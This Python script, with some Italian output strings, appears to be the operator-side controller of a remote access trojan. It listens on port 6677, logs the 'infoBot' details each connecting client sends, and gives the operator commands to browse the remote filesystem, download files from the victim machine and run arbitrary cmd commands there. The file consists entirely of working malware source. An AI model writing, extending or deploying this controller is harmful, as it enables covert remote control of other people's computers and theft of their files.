import os
from socket import *
import datetime

checkConnectionPort = 23000
serverPort = 6677
# 0.0.0.0 default
serverName = '0.0.0.0'

while True:
    try:
        # AF_INET = IPV4; SOCK_STREAM = TCP
        serverSocket = socket(AF_INET, SOCK_STREAM)
        serverSocket.bind((serverName, serverPort))
        serverSocket.listen(1)
        print('The server is ready to receive')
        connectionSocket, addr = serverSocket.accept()
        print('Accepted a new client', addr)
        infoBot = connectionSocket.recv(8192).decode()
        print('Informazioni ottenute: \n', infoBot)
        try:
            file = open(str(datetime.datetime.now().strftime('%Y-%m-%d %H-%M-%S')) + '.txt', 'w')
            file.write(infoBot)
            file.close()
            print("Ho salvato il log in "+os.getcwd())
        except Exception as e:
            print(e)
        connectionSocket.send('ok'.encode())
        command = ''
        while command != 'exit':
            print('Commands: ls, cd, get [file_name], cmd commands (on Windows systems)')
            command = input('Input a command:	')

            if command == 'ls':
                connectionSocket.send('ls'.encode())
                ls = connectionSocket.recv(409600).decode()
                cwd = connectionSocket.recv(409600).decode()
                print(ls)
                print('Current working directory:	', cwd)

            if command == 'exit':
                connectionSocket.send('exit'.encode())
                break

            if command.startswith('cd') and command[1:].strip():
                if len(command) != 2:
                    string = '1'+command.split(" ")[1]
                    connectionSocket.send(string.encode())
                    print('New path:	', connectionSocket.recv(90000000).decode())
            if command.startswith('get') and len(command) > 3:
                string = '0'+command.split(" ")[1]
                connectionSocket.send(string.encode())
                msg = connectionSocket.recv(16).decode()
                if msg == '1':
                    data = connectionSocket.recv(90000000)
                    file = open(string[1:], "wb")
                    print("Receiving the file data.")
                    file.write(data)
                    file.close()
                else:
                    print("Syntax error (you probably selected a folder or protected file)")

            if command != 'ls' and command != 'exit' and not command.startswith('cd') and not command.startswith('get'):
                connectionSocket.send(command.encode())
                out = connectionSocket.recv(1024).decode()
                print(out)
        connectionSocket.close()
        break
    except Exception as e:
        connectionSocket.close()
        print('Connection lost, retrying...')
        continue
    break
